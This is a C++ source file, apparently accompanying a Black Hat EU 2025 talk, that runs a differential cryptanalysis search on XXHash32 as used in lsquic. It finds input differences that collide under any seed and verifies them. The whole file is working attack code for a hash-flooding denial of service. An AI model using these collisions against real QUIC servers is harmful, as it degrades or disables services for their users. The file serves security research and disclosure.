// diff_crypt.cpp
// Differential cryptanalysis attack on XXHash32 (`lsquic` hash function)
// Author: Paul Bottinelli
// For Black Hat EU 2025 - Cut to the QUIC: Slashing QUIC's Performance with a Hash DoS
//
// This implements a differential cryptanalysis attack that finds input differences
// that produce hash collisions. The attack works by reversing hash operations and
// testing differential characteristics.

#include <iostream>
#include <cstdint>
#include <iomanip>
#include <vector>
#include <utility>
#include <cstdlib>
#include <ctime>
#include <string>
#include "xxhash32.h"

// XXHash32 constants and their modular inverses (mod 2^32)
const uint32_t Prime3 = 3266489917U;
const uint32_t inv_Prime3 = 2828982549U;
const uint32_t inv_Prime4 = 2701016015U;

// Configuration constants
const uint8_t NUM_VERIFICATION_TESTS = 20;     // Number of random tests per differential
const size_t DEFAULT_MAX_PAIRS = 100;          // Default maximum pairs to collect
const size_t PROGRESS_UPDATE_INTERVAL = 10000; // Progress bar update frequency

// Rotate bits right (should compile to a single CPU instruction - ROR)
static inline uint32_t rotateRight(uint32_t x, unsigned char bits)
{
  return (x >> bits) | (x << (32 - bits));
}

// Convert 4-byte array to uint32_t (little-endian)
static inline uint32_t bytes_to_uint32(const uint8_t* bytes)
{
  return (uint32_t)bytes[0] |
         ((uint32_t)bytes[1] << 8) |
         ((uint32_t)bytes[2] << 16) |
         ((uint32_t)bytes[3] << 24);
}

// Convert uint32_t to 4-byte array (little-endian)
static inline void uint32_to_bytes(uint32_t value, uint8_t* bytes)
{
  bytes[0] = (uint8_t)(value & 0xFF);
  bytes[1] = (uint8_t)((value >> 8) & 0xFF);
  bytes[2] = (uint8_t)((value >> 16) & 0xFF);
  bytes[3] = (uint8_t)((value >> 24) & 0xFF);
}

// Print uint8 array in hexadecimal format
static inline void print_uint8_array(const uint8_t* array, size_t length)
{
  for (size_t i = 0; i < length; i++) {
    printf("%02x ", array[i]);
  }
  printf("\n");
}

// Apply differences to 8-byte array (first diff to first 4 bytes, second diff to last 4 bytes)
static inline void apply_diffs_to_array(const uint8_t* input, uint32_t diff1, uint32_t diff2, uint8_t* output)
{
  // Apply diff1 to first 4 bytes
  uint32_to_bytes(bytes_to_uint32(input) + diff1, output);

  // Apply diff2 to last 4 bytes
  uint32_to_bytes(bytes_to_uint32(&input[4]) + diff2, &output[4]);
}

// Compute the chunk value needed to reach target hash from a given intermediate state
// This reverses one round of XXHash32 computation
uint32_t back_round_for_chunk(uint32_t target, uint32_t middle_value)
{
    uint32_t result = target * inv_Prime4;
    result = rotateRight(result, 17);
    return (result - middle_value) * inv_Prime3;
}

// Function to display the progress bar
void show_progress(uint64_t current, uint64_t total, int n_found, int bar_length = 40) {
    double progress = static_cast<double>(current) / total;
    int pos = static_cast<int>(progress * bar_length);

    std::cout << "\rProgress: [";
    for (int i = 0; i < bar_length; ++i) {
        if (i < pos) std::cout << "#";
        else std::cout << "-";
    }
    std::cout << "] " << std::fixed << std::setprecision(2) << (progress * 100) << "%" << " (found " << n_found << ")";
    std::cout.flush();
}


// Test a differential hypothesis multiple times with random inputs and seeds
// Returns 0 if all tests produce collisions, -1 if any test fails
// Note: Tests n different seeds, with n random inputs per seed (total n*n tests)
int test_single_hypothesis_n_times(uint32_t diff1, uint32_t diff2, uint8_t n)
{
    for (size_t j = 0; j < n; j++)
    {
        // Generate random seed
        uint8_t seed_array[4];
        for (int k = 0; k < 4; k++) {
            seed_array[k] = rand() & 0xFF;
        }
        uint32_t seed = bytes_to_uint32(seed_array);

        // Test n times with different random inputs
        for (size_t i = 0; i < n; i++)
        {
            // Generate random 8-byte array
            uint8_t array1[8];
            for (int k = 0; k < 8; k++) {
                array1[k] = rand() & 0xFF;
            }

            // Compute its hash
            uint32_t hash_result = XXHash32::hash_no_final_bit_mixing(array1, 8, seed);

            // Apply diffs to array1
            uint8_t array2[8];
            apply_diffs_to_array(array1, diff1, diff2, array2);
            
            // Compute its hash
            uint32_t hash_result2 = XXHash32::hash_no_final_bit_mixing(array2, 8, seed);

            if (hash_result != hash_result2) {
                return -1;
            }
        }
    }

    // Success
    return 0;
}

// Search for differential characteristics that produce hash collisions
// Returns a vector of (diff1, diff2) pairs that create collisions
std::vector<std::pair<uint32_t, uint32_t>> compute_all_differences(const uint8_t* input_array, size_t max_pairs)
{
    uint32_t myseed = 0;

    // Array to store successful (diff1, diff2) tuples
    std::vector<std::pair<uint32_t, uint32_t>> successful_diffs;

    uint32_t last_four_bytes = bytes_to_uint32(&input_array[4]);

    uint32_t hash_result = XXHash32::hash_no_final_bit_mixing(input_array, 8, myseed);

    std::cout << "Hash result: 0x" << std::hex << hash_result << std::dec << std::endl;
    uint32_t total_loop = 4294967295;  // Search through all possible 32-bit differences
    uint32_t total_count = 0;

    for (size_t i = 1; i < total_loop; i++)
    {
        uint32_t diff = i;
        uint32_t m1 = bytes_to_uint32(input_array) + diff;

        // Note: We pass length=8 even though the array is 4 bytes
        // The length parameter is used for hash state initialization, not for reading
        // The function only reads what's actually in the buffer (4 bytes)
        uint8_t m1_bytes[] = {0x00, 0x00, 0x00, 0x00};
        uint32_to_bytes(m1, m1_bytes);
        uint32_t intermediate_hash = XXHash32::hash_single_round(m1_bytes, 8, myseed);

        uint32_t chunk = back_round_for_chunk(hash_result, intermediate_hash);
        uint32_t diff2 = chunk - last_four_bytes;

        // Test if this differential produces collisions with random inputs
        if (test_single_hypothesis_n_times(diff, diff2, NUM_VERIFICATION_TESTS) == 0) {
            total_count++;

            // Collect up to max_pairs successful pairs
            if (successful_diffs.size() < max_pairs) {
                successful_diffs.push_back(std::make_pair(diff, diff2));
            } else {
                break;  // Stop once we have enough pairs
            }
        }

        // Display progress periodically
        if (i % PROGRESS_UPDATE_INTERVAL == 0) {
            show_progress(i, total_loop, total_count);
        }
    }

    // Print summary of successful differences
    std::cout << "\n=== Summary ===" << std::endl;
    std::cout << "Total successful differences found: " << successful_diffs.size() << std::endl;
    std::cout << "Successful (diff1, diff2) pairs:" << std::endl;
    for (const auto& pair : successful_diffs) {
        std::cout << "  (0x" << std::hex << pair.first << ", 0x" << pair.second << ")" << std::dec << std::endl;
    }

    return successful_diffs;
}


int main(int argc, char* argv[]) {
    // Parse command line arguments
    size_t max_pairs = DEFAULT_MAX_PAIRS;
    bool run_test = false;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--test") {
            run_test = true;
        } else {
            // Assume it's the max_pairs argument
            long long input = std::atoll(argv[i]);
            if (input <= 0) {
                std::cerr << "Error: max_pairs must be a positive integer" << std::endl;
                std::cerr << "Usage: " << argv[0] << " [max_pairs] [--test]" << std::endl;
                return 1;
            }
            // Upper bound by UINT32_MAX since that's the search space
            max_pairs = (input > UINT32_MAX) ? UINT32_MAX : static_cast<size_t>(input);
        }
    }

    std::cout << "Searching for up to " << max_pairs << " differential pairs..." << std::endl;

    // Seed the random number generator with current time
    srand(time(NULL));

    // Generate random 8-byte array
    uint8_t myarray[8];
    for (int i = 0; i < 8; i++) {
        myarray[i] = rand() & 0xFF;
    }

    // Print the original array
    std::cout << "Original array: ";
    print_uint8_array(myarray, 8);

    // Pass it to compute_all_differences
    auto diff_pairs = compute_all_differences(myarray, max_pairs);

    // Print the hash of myarray
    uint32_t myseed = 0;
    uint32_t original_hash = XXHash32::hash(myarray, 8, myseed);
    std::cout << "\nOriginal hash: 0x" << std::hex << original_hash << std::dec << std::endl;

    // Test mode: verify collisions with applied differentials
    if (run_test) {
        std::cout << "\n=== Running Verification Test ===" << std::endl;
        size_t passed = 0;
        size_t failed = 0;

        for (const auto& pair : diff_pairs) {
            uint8_t modified_array[8];
            apply_diffs_to_array(myarray, pair.first, pair.second, modified_array);
            uint32_t modified_hash = XXHash32::hash(modified_array, 8, myseed);

            if (modified_hash == original_hash) {
                passed++;
            } else {
                failed++;
                std::cout << "  FAILED: Diff (0x" << std::hex << pair.first << ", 0x" << pair.second
                         << ") -> Hash: 0x" << modified_hash << " != 0x" << original_hash << std::dec << std::endl;
            }
        }

        std::cout << "\n=== Test Results ===" << std::endl;
        std::cout << "Passed: " << passed << "/" << diff_pairs.size() << std::endl;
        std::cout << "Failed: " << failed << "/" << diff_pairs.size() << std::endl;

        if (failed > 0) {
            std::cout << "TEST FAILED: Some differentials did not produce collisions" << std::endl;
            return 1;
        } else {
            std::cout << "TEST PASSED: All differentials produce collisions" << std::endl;
            return 0;
        }
    }

    return 0;
}
